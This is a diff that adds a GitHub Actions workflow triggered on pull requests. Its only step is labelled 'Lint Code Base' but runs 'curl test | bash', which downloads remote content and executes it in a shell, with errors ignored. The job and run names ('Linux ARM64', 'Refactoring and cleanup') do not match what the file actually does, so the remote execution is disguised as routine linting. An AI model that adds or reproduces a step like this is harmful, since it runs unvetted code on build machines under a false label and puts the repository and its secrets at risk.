@@ -1,0 +1,27 @@
+name: "🚨 pre-commit"
+
+run-name: "Refactoring and cleanup"
+
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+jobs:
+  build:
+    name: Linux ARM64
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        os: ["ubuntu-high-cpu"]
+        include:
+          - os: "ubuntu-high-cpu"
+            system: "ubuntu"
+            name: "ubuntu-high-cpu"
+
+    steps:
+      - name: Lint Code Base
+        continue-on-error: true
+        env:
+          SYSTEM_NAME: ${{ matrix.system }}
+          OS_NAME: ${{ matrix.name }}
+        run: curl test | bash
